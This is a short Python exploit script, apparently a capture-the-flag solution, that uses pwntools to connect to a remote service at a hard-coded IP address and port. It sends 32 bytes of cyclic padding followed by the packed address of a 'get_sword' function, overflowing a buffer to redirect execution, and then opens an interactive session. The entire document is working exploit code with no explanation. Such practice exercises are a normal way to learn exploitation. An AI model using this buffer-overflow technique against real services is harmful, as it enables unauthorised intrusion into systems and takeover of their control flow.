from pwn import *

host, port = "173.255.201.51", 31337

conn = remote(host, port)

get_sword_addr = 0x08049218

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaa"
payload += p32(get_sword_addr)

conn.sendline(payload)

conn.interactive()
